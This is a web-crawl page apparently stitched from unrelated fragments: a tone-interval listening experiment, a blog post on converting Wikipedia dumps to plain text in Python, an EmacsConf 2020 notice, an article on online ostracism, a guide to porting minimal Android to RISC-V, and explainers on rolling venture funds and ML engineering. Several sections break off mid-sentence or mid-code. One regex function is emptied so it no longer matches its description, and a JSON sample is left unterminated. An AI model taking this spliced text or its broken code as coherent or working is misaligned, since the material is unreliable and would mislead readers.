          The interval used in 1 and 2 is one tone (two semitones). The
          interval used in 3 is less than a tone. This difference in the
          intervals may be too small for non-musicians to discern. Go to
          the <a href="#exb">next section</a> to see another experiment
          with larger intervals that might be easier for non-musicians.
        </p>
      </li>
    </ul>

    <!-- Non-Musician-Friendly -->
    <h2 id="exb"><a href="#exb">Experiment B</a></h2>

    
    <ul>
      <li>
        <p>
          Play interval 1 first. It goes from 400&nbsp;Hz to
          480&nbsp;Hz. The difference between the frequencies is
          80&nbsp;Hz. The second frequency is 20% more than the first.
        </p>
      </li>
      <li>
        <p>
          Then play interval 2. It goes from 800&nbsp;Hz to 960&nbsp;Hz.
          The difference between them is 160&nbsp;Hz. The second
          frequency is again 20% more than the first.
        </p>
      </li>
      <li>
        <p>
          Now play interval 3. It goes from 800&nbsp;Hz to 880&nbsp;Hz.
          The difference between them is 80&nbsp;Hz. The second
          frequency is only 10% more than the first.
        </p>
      </li>
      <li>
        <p>
          Do intervals 1 and 2 feel equal? That's because both have 20%
          increase in frequency.
        </p>
      </li>
      <li>
        <p>
          Do intervals 1 and 3 feel unequal? That's because interval 1
          has 20% increase in frequency whereas interval 2 has only 10%
          increase in frequency.
        </p>
      </li>
      <li>
        <p>
          If the intervals sound unpleasant to you because the frequencies
          do not correspond to any valid notes or intervals in music, go
          to the <a href="#ex1">previous section</a> to see another
          experiment for musicians.
        </p>

  <h2>I want an offline encyclopedia and am extremely masochistic</h2>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>''</span><span>,</span> <span>''</span><span>,</span> <span>text</span><span>)</span> 
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>


<span>def</span> <span>remove_double_brackets</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>double_brackets</span> <span>=</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>'\[\[.*?\]\]'</span><span>,</span> <span>text</span><span>)</span>
        <span>for</span> <span>db</span> <span>in</span> <span>double_brackets</span><span>:</span>
            <span>if</span> <span>'|'</span> <span>in</span> <span>db</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>split</span><span>(</span><span>'|'</span><span>)[</span><span>-</span><span>1</span><span>].</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
            <span>else</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>strip</span><span>(</span><span>'['</span><span>).</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>
</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"2618"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"Aeacus (; also spelled Eacus; Ancient Greek: </span><span>\u</span><span>0391</span><span>\u</span><span>1f30</span><span>\u</span><span>03b1</span><span>\u</span><span>03ba</span><span>\u</span><span>03cc</span><span>\u</span><span>03c2 Aiakos or Aiacos) was a mythological king of the island of Aegina..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Aeacus"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"3201"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"[[File:Global_Temperature_And_Forces.svg|thumb|upright=1.35|right|Observed temperature from NASA. vs the 1850</span><span>\u</span><span>20131900 average used by the IPCC as a pre- industrial baseline..

  </span><span>"title"</span><span>:</span><span> </span><span>"Attribution of recent climate change"</span><span>
 </span><span>},</span><span>
</span><span>]</span><span>
</span></code></pre></div></div>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>



<p>I can tolerate a few aberrations here and there but the perfectionist in me wants to do better. Anyways, here’s my script as it stands today:</p>

<p>It’s not the most elegant solution but for just over 100 lines of code, it will parse almost all of Wikipedia and save it to 40MB chunks of JSON.
Running this script looks like the following:</p>

<p>EmacsConf 2020 | Online Conference | <strong>November 28 and 29, 2020</strong><br>
<a href="https://emacsconf.org/i/emacsconf-logo1-256.png"><img src="https://emacsconf.org/i/emacsconf-logo1-256.png" width="256" height="256" alt="EmacsConf logo"></a><br>

<a href="https://emacsconf.org/conduct/">Code of Conduct</a></p>

<p>EmacsConf is the conference about the joy of Emacs, Emacs Lisp, and
memorizing key sequences.</p>

<p>EmacsConf 2020 was on November 28 (Sat) and November 29 (Sun),
2020 from 9am-5pm Toronto/EST time; equivalently, 6am-2pm PST,
2pm-10pm UTC, 3pm-11pm Zurich/CET.</p>

<p>It made sense to hold EmacsConf 2020 as a virtual (online) conference
again this year, especially now, given the current state of the world
with the ongoing global pandemic. We remain fully committed to
freedom, and we will continue using our infrastructure and streaming
setup consisting entirely of <a href="https://www.gnu.org/philosophy/free-sw.html">free software</a>, much like the
last EmacsConf. Check out the <a href="https://emacsconf.org/2020/schedule/"><strong>Schedule</strong></a> and
<a href="https://emacsconf.org/2020/poster/"><strong>Poster</strong></a> for more details.</p>

<h2>Watching</h2>

<p>Over the next few weeks, we'll split up the bulk video recordings into
individual talks. We'll post the videos and links on the individual
talk pages, and we'll send an update to the
<a href="https://lists.gnu.org/mailman/listinfo/emacsconf-discuss">emacsconf-discuss</a> mailing list. In the meantime,
please enjoy <a href="https://emacsconf.org/2019/talks/">last year's talks</a>.</p>

<h2>Participating</h2>

<p>For audience questions specifically, we experimented with using a
collaboratively-editable Etherpad as the primary means of collecting
audience questions. <a href="https://etherpad.wikimedia.org/p/emacsconf-2020">https://etherpad.wikimedia.org/p/emacsconf-2020</a>
We also took questions from our IRC channel (<code>#emacsconf</code> on
<code>chat.freenode.net</code>), with volunteers adding questions from that
channel to the pad on behalf of folks who were not able to or prefer
not to use the web-based questions pad.</p>

<p>Come hang out with us in <code>#emacsconf</code> on <code>chat.freenode.net</code>.  You can
join the chat using <a href="ircs://chat.freenode.net:6697/emacsconf">your favourite IRC client</a>, or by visiting
<a href="https://chat.emacsconf.org/">chat.emacsconf.org</a> in your web browser, a self-hosted instance
of <a href="https://thelounge.chat/">The Lounge</a> free software web IRC client for EmacsConf.</p>

<p>To follow up after the conference, please check the <a href="https://emacsconf.org/2020/schedule/">schedule</a> for
the link to the individual talk page. Over the next few weeks, we'll
add notes from the pad, other resources, and followup contact
information from speakers.</p>

<h2>Updates</h2>

<p>Be sure to subscribe to our mailing list
<a href="https://lists.gnu.org/mailman/listinfo/emacsconf-discuss">emacsconf-discuss</a> for discussion and
announcements about the conference.</p>

<p>If you harbor a bit of angst over Facebook friend requests gone unanswered, a surprise “defriending” or being deserted by your Twitter followers, you’re not alone. <a href="https://pdfs.semanticscholar.org/c228/e440fb12a64e3489a16362ec614475c5ccf5.pdf" target="_blank" rel="noreferrer noopener">You are feeling <strong>Cyberostracism</strong> which is called effects of Being Ignored Over the Internet.</a></p>



<p>Or, increasingly, how many&nbsp;Twitter&nbsp;followers they have. This year, a third-party service launched Qwitter, which allows Twitter users to determine who’s stopped following them and which tweet may have turned them off.</p>



<p>Ostracism, the act of ignoring and exclusion, has been widely<br>documented as ubiquitous and powerful. Ostracism occurs across the life span. Young children use forms of ostracism on each other during supervised play, and adolescents, particularly girls, are likely to use ostracism in their conflicts. Most adults will at some point in their lives be targets and sources of ostracism (we use the terms “target” and “source” to refer to the individuals who are ostracized and who ostracize.</p>



<p>In a representative survey of over 2,000 Americans, 67% admitted to using “the silent treatment,” a punitive form of ostracism, on a loved one, whereas 75% indicated that they had been a target of the silent treatment by a loved one. </p>



<p>Experts say rejection on social networks can hurt worse than an in-person snub because people are usually more polite face-to-face than they are online.</p>



<p>“I think the thing that is often clearly worse online is when it’s relatively anonymous, and people use that as a cover and are more cruel than they would be otherwise,” said Jean Twenge, a San Diego State psychologist who has studied the way social networking affects personality development.</p>



<p>These data include Williams’ “cyberball” studies, which ask a participant to play a virtual ball-tossing game with two other icons. In one study group, the participant plays the game for the entire six minutes, but in the second group, he or she is included for only a fraction of that time and then ignored. The second group reports feelings of anger and lower levels of self-esteem.</p>



<p>Whether participants believe they’re playing with humans doesn’t appear to affect their feelings of rejection.. Even when people get rejected by the computer, they feel bad.</p>



<p>The study also affected the way how participants interacts online. Out of the 1,200 friends he has on&nbsp;Facebook, 400 of them he doesn’t really know, many of them being friends of friends.</p>



<p>“I thought about defriending them, but I didn’t want them to feel how I felt” during the “cyberball” game, said a participant.</p>



<p>Cecilia Sepp, a Washington, D.C.-area consultant, said she avoids the issue entirely by limiting her online network to about 100 friends.</p>



<p>“I don’t have a problem with defriending because I don’t accumulate [enough] to have a high number,” Sepp said.</p>



<p>“When I first heard that defriending was beginning on social networks, it was through a blog post by someone who was shocked that this person had defriended them because they didn’t understand why,” she said. “The person wanted to know had they done something, had they said something, should they ask, ‘What did [I] do?’ ” </p>

<p>Chen Wang, 2020.11.24</p>

<p>After a period of hard work, we can now run an Android “minimal system” on QEMU of RISC-V.</p>

<p>The following is a brief summary of the current work. Although the road ahead is still long, there is something to have a look.</p>

<h2 id="1-requirement-analysis">1. Requirement analysis</h2>

<p>The full name of our project is “AOSP for RISC-V”, and all the source code is currently opened on github: <a href="https://github.com/aosp-riscv">https://github.com/aosp-riscv</a>. The ultimate goal of our project is to port Android on RISC-V. Of course, this goal is huge.</p>

<p>But in the short term, we still have a small goal, which is described in one sentence: <code>based on the RISC-V platform, realize the kernel part of Android running on QEMU, and run the Android Shell</code>.</p>

<p>Based on the above objectives, the specific analysis is to realize a minimal Android system. The meaning of “minimal system” here is the so-called “bootable unix-style command line operating system”. In the traditional sense, a complete “minimal system” is described on the left side of the figure below. From bottom to top, the bottom is the hardware (note: hardware is not part of our “minimal system”). The first layer of software running on the hardware is the “Operating System Kernel”, and upon the OS kernel is the <a href="https://en.wikipedia.org/wiki/C_standard_library">“C library”</a>. Based on the C Library, we can build a minimal file system, which is essentially a bunch of command-line tools. These command-line tools must include at least a <a href="https://en.wikipedia.org/wiki/Init">“init”</a>, which is used to start the basic login shell in cooperation with the kernel, and one <a href="https://en.wikipedia.org/wiki/Unix_shell">“Shell”</a> is used to interact with users and call other tools and programs. With this “minimal system”, our big goal has a foundation.</p>

<p><img src="https://plctlab.github.io/aosp/diagrams/mini-system.png" alt="a minimal unix-style os"></p>

<p>Through the investigation of AOSP, I roughly summarized the work we need to achieve as follows:</p>

  <li>Hardware part: Here we first use QEMU for RISC-V to simulate.</li>
  <li>OS Kernel: The kernel of Android uses Linux, of course, it has some patches of its own.</li>
  <li>C Library: Android has its own C library, which is bionic. It differs from the GNU C library (glibc) in that it is designed for devices with low memory and processor capabilities and running on Linux. It is released under the BSD license, rather than using the GNU public license like glibc.</li>
  <li>Root filesystem: Android has its own complex file system organization. As the goal of our experiment, what we need is the most streamlined and smallest file system. There is no need to transplant the complete Android system over, so I chose toybox to implement our various kind of command line tool. Someone may ask why we don’t use the more famous busybox. The reason is still related to the software license. Busybox uses GPL, while toybox uses BSD, which is more in line with Android’s appetite. Therefore, toybox is included in the source tree of AOSP, but busybox is not. In addition, I need to mention, because the implementation of toybox is very simple, the shell that provided by toybox does not work properly. Fortunately, Android already has its own official Shell, which is mksh, so we use mksh directly.</li>
</ul>

<h2 id="2-introduction-to-porting-work">2. Introduction to porting work</h2>

<p>The above talked about what needs to be done in the overall porting work. In fact, there are still many details in the specific implementation. Since our final goal (to transplant AOSP as a whole to RISC-V) is far from being achieved, I will briefly sort out what I have achieved so far, just for memo:</p>

<ul>
  <li>Operating platform (hardware): currently adopt QEMU temporarily.</li>
  <li>AOSP version: tag based on <code>android-10.0.0_r39</code>.</li>
  <li>Toolchain environment: building of AOSP has been completely migrated to LLVM/CLANG, but GNU tools are still used in linking. Since the prebuild tool chain that comes with AOSP does not support RISC-V, I have to build my own LLVM/Clang and GNU-tools.</li>
  <li>Kernel porting: the kernel version I used tag <code>android-5.4-stable</code> for andorid common repository plus tag <code>android11-release</code> for configs repository.</li>
  <li>The porting of the BIONIC library, as mentioned earlier, is based on the tag <code>android-10.0.0_r39</code> too. Considering the requirements in first phase, only the static library of libc is implemented, the dynamic library of libc is not implemented, neither for libm/libdl/libstdc++/linker till now (but I will handle them soon later). In other words, the following executable programs such as toybox and mksh are statically linked. libc is the most important part of bionic, and the composition is quite complex. The main components and the dependencies between them are briefly summarized in following diagram:</li>
</ul>

<p><img src="https://plctlab.github.io/aosp/diagrams/bionic-libc.png" alt="bionic libc"></p>

<ul>
  <li>toybox: As mentioned earlier, it is based on tag <code>android-10.0.0_r39</code>, but with a lot of tailoring. Because the toybox in Android includes many Android-specific features, such as SELinux and encryption, etc. In order not to involve too much effort in current phase, I disabled these functions and only retain some basic common functions.</li>
  <li>mksh: The Shell looks relatively simple, just make sure there is no problem with the compilation.</li>
  <li>There is also a big work involved in the construction of the build system. I did not use the native Soong system that comes with AOSP, because in the pre-research process, I found that it is not easy to add a new ARCH from scrach in the existing AOSP build system (i.e. to use the traditional lunch + m). AOSP’s building system is too complicated and mature for existing ARCH that supported, but it is not friendly to latecomers. In order to reduce the risk and focus on the key areas in advance, I chose to use make and rewrite the makefiles for modules (bionic/toybox/mksh) that need to be ported. Of course, we still need to find a chance to move to AOSP Soong later, just let’s do it later.</li>
</ul>

<h2 id="3-steps-to-make-this-minimal-system">3. Steps to make this minimal system</h2>

<p>After some work, the above small goal has been initially completed, and at least one of the “minimal Android systems” we defined above can be launched on QEMU. The related porting and modification have been opened on github. Allow me brief following steps and you are welcomed to have a try and test, submit PR, or directly participate in our AOSP porting work.</p>

<h3 id="31-environmental-preparation">3.1 Environmental preparation</h3>

<p>The experiment is based on Ubuntu 20.04 LTS</p>

<div><div><pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 20.04 LTS
Release: 20.04
Codename: focal
</code></pre></div></div>

<p>The software that needs to be installed in advance is as follows:</p>

<div><div><pre><code>$ sudo apt install autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev \
                  gawk build-essential bison flex texinfo gperf libtool patchutils bc \
                  zlib1g-dev libexpat-dev git \
                  libglib2.0-dev libfdt-dev libpixman-1-dev \
                  libncurses5-dev libncursesw5-dev
</code></pre></div></div>

<p>Then create a working directory <code>riscv64-linux</code>, the following operations are performed under this directory.</p>

<div><div><pre><code>$ mkdir riscv64-linux
$ cd riscv64-linux
</code></pre></div></div>

<h4 id="311-building-gnu-toolchain">3.1.1 Building GNU toolchain</h4>

<p>Download source code</p>

<div><div><pre><code>$ git clone https://github.com/riscv/riscv-gnu-toolchain
</code></pre></div></div>

<p>Enter the source directory:</p>



<p>Note that the main repository of clone above does not contain the contents of the sub-repositories, so you need to continue to update the sub-repositories. Note that the sub-repository of qemu is excluded first, because the complete download of qemu is too large; second, qemu is actually not needed for the toolchain compilation itself.</p>

<div><div><pre><code>$ git rm qemu
$ git submodule update --init --recursive
</code></pre></div></div>

<p>Wait patiently for the sub-repository download to complete.</p>

<p>Note that due to I want to install the tools to <code>/opt/riscv64</code>, so sudo is required for make.</p>

<div><div><pre><code>$ ./configure --prefix=/opt/riscv64
$ sudo make linux -j $(nproc)
</code></pre></div></div>

<p>Export the installation path of the toolchain. You can also write to the <code>.bashrc</code> file.</p>

<div><div><pre><code>export PATH="$PATH:/opt/riscv64/bin"
</code></pre></div></div>

<p>Test whether the toolchain is installed successfully.</p>

<div><div><pre><code>$ riscv64-unknown-linux-gnu-gcc -v
</code></pre></div></div>

<p>Output similar to the following shows that the toolchain is compiled and installed normally.</p>

<div><div><pre><code>Using built-in specs.

</code></pre></div></div>

<h4 id="312-build-llvmclang-tool-chain">3.1.2 Build LLVM/Clang tool chain</h4>

<p>Make sure to return to the working directory <code>riscv64-linux</code> first.</p>

<p>After updating Ubuntu 20.04 LTS to the latest state, the software requirements for building llvm/clang should have been supported by default. Other tools needed in the compilation process are basically available on Ubuntu. If something is missed, please install it yourself.</p>

<p>Download the source code of llvm. The official source code repository is at github: <a href="https://github.com/llvm/llvm-project">https://github.com/llvm/llvm-project</a>.</p>

<div><div><pre><code>$ git clone https://github.com/llvm/llvm-project
</code></pre></div></div>

<p>After downloading, enter the root directory of the source code repository and check out the corresponding version. I choose thhe official release version <code>10.0.1-final</code> and switch to the <code>10.x</code> branch.</p>

<div><div><pre><code>$ cd llvm-project/

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-ix="fade-in-blog-post" id="continue-reading" data-w-id="090c74fd-0c24-ef76-0192-8c569ddeea91"><div><div data-ix="hide-blog-content-block" id="read-post"><div><div><p>Rolling Venture Funds are a hot commodity of the moment in the venture investing world. Pioneered by <a href="https://angellist.com/" target="_blank">AngelList</a>, they are a new form of venture capital fund structure meant to empower first-time fund managers to turn their network and audience into a small recurring stream of committed capital that they can deploy into startups on an ongoing basis. We wanted to quickly breakdown the new structure and explain how rolling funds work and how they are different than traditional venture capital funds.</p><p>Typical VC funds typically have a 7-10 year lifecycle with the first 3-4 years dedicated as the funds “active phase”, which is essentially when the General Partners or GPs (people sourcing and vetting investment opportunities) are looking to deploy capital into new investment opportunities (companies they believe have growth opportunities ahead). Traditional VC funds have “committed” capital, meaning when you hear a fund announce a “$100M” fund, they aren’t actually holding the money. Limited Partners or LPs (pension funds, endowments, hedge funds, family offices and other accredited investors) commit to a certain amount of 💰 that they will make available to the General Partners over the life of the fund. When the GPs of the fund find an investment opportunity they agree on, they must bring it to their LPs and “call” or request the capital necessary to fill the investment be released.</p><p>Generally speaking, the fund deploys roughly 40-50% (not exact, and this number can vary from fund to fund but this generally holds) of its committed capital during its 4-year active period. The fund then goes dormant, meaning that for the next 3-6 years the GPs will not look to make investments in new companies, but rather support their existing investments and help them grow and scale. What about the remaining 50-60% (we left management fees out of this breakdown)? Well, that money is meant to be deployed over that 3-6 year timeframe to support existing investments (bridge round, emergency capital, etc.) and for the fund to exercise its pro-rata rights, which essentially allows them to buy shares in subsequent funding rounds to maintain the % of ownership the fund has. Whew, that was a mouth full, so how do Rolling Funds differ?</p><p>Rolling Funds (so far) are structured on a quarter-long lifecycle, that is it, the fund is “active” like the traditional fund for 90 days. But don’t fret if it sounds like this is a painfully short lifetime. Rolling Funds are subscribed to by LPs on a subscription basis. What does that mean, each quarter the LPs commits to a certain 💰 amount and on the first day of that quarter puts their commitment into the fund along with all the other LPs and the fund is now active and goes to work. Unlike the Traditional Fund, the Rolling Fund will look to deploy 100% of their held capital(meaning the fund holds the $$ that was committed for the quarter by the LPs) in that 90 day “active” window. Once the quarter ends the fund closes and becomes “dormant” like the traditional VC fund.</p><p>The major difference is on the first day of the next quarter, the LPs (if they choose to continue subscribing) send in their quarterly commitment, and a new (legally separate) fund is created with fresh capital and the same 90-day journey to deploy their “held” capital begins again. If during a quarter, the fund does not deploy all the held capital that is raised, those funds roll over into the next quarter and are combined with the fresh capital from the LPs subscription in the new quarter’s fund. Without having to make capital “calls” the goal of these Rolling Funds is to empower the GPs to move quickly and make investments in startups without both parties needed to wait for LPs to get onboard. With fresh capital each quarter, Rolling Funds will be in a constant state of new deal-finding which is a positive for founders looking for capital. One thing that is yet to be seen is how Rolling Funds will a) support existing investments that require additional capital, or b) when the opportunity to exercise pro-rata rights comes into play.</p><p>Given that these Rolling Funds don’t have a built-in “reserve” pool like a Traditional Fund could GPs work with their LPs to coordinate quarter to quarter to adjust the size of their “subscription” to the fund in the event that a quarter arises when an investment from a previous fund requires additional capital and/or the opportunity to excise pro-rata rights. Obviously, this will require the GP and their LPs to be aligned on the opportunity but it does present an interesting opportunity to increase capital in a given quarter to maximize a stake in a subsequent funding round.</p><p>Sorry for this post getting a little longer than our usual but we wanted to really dive into the function of both of these fund structures. Long story short, Rolling Funds will more consistently be active with fresh capital whereas towards the end of a Traditional Funds “active” period, they might not have as much capital to deploy in as many deals until they raise another fund. We hope this is a helpful resource so you can understand the mechanics of both these structures and as a founder seeking funding, you can leverage that into aligning your startup with the right type of venture partner.</p></div></div></div></div></div></div>]]>

<p>Developing a solution with machine learning is equal parts science and software engineering. The science of it is important, certainly, but your success will be equally dependant, if not more, on how you engineer your solution. Given the abundance of libraries that implement state-of-the-art algorithms for easy consumption and the data (and pre-trained models) to go with them, your ability to engineer your code well is the critical component for your success.</p>

<blockquote>
  <p>Between two somewhat comparable data scientists, the one with better software engineering skills is more likely to succeed in a machine learning project than the one with better machine learning skills.</p>
</blockquote>

<p>The reasons are twofold. First, the barrier to entry to build effective models is getting lower as many high-level libraries make it increasingly easier to solve a wide variety of problems in machine learning and deep learning. State-of-the-art results become available (as pre-trained models) in a matter of weeks after publication. There is always a tutorial around the corner showing you how to tackle your ml/dl problems with freely available tools.</p>

<p>Secondly, the data science culture is a mess, leading to a focus on model performance rather than real-life performance (which can be measured only after deployment). For data scientists, the impetus is more on getting the experiments right, quickly; whatever it takes to achieve that! But the value from data science/machine learning projects comes from their deployment, not modeling experiments.</p>

<blockquote>
  <p>A more effective data scientist is the one who deploys more often, not the one with better model scores.</p>
</blockquote>

<p>The culture around this is changing though, and we hope to be a part of that change.</p>



<p>In this issue, we focus on our perception of the core reasons coming from working with and educating a lot of data scientists over the years.</p>

<p>Primarily, we think the problem arises from how the <strong>Cult of Kaggle</strong> (not in the way you think) promoted a habit of <strong>State Mismanagement</strong>, which results in <strong>Poorly abstracted codebases</strong> hurting data science projects.</p>



<p>Kaggle is a competition platform for machine learning and deep learning, and a lot of people complain that Kaggle is not real data science. That it sets up wrong expectations with its super-clean datasets neatly divided into train/test-sets, freeing the data scientist to focus only on the modeling problem and not have to worry about data issues.</p>

<p>While this is a valid criticism, we believe that there is a place and utility for such a platform. Given the fantastic community that has come up around Kaggle, it is now one of the most popular platforms for new (and old) data scientists to hone their craft.</p>

<p>The problem is the outsized role Kaggle plays in the education of data scientists. Given a new problem, most will try to get to those train/test-sets (and possibly a validation-set thrown in) and try to get a model that “works” in the <a href="https://en.wikipedia.org/wiki/Empirical_risk_minimization">empirical risk management</a> sense (on the test-set, of course).</p>

<blockquote>
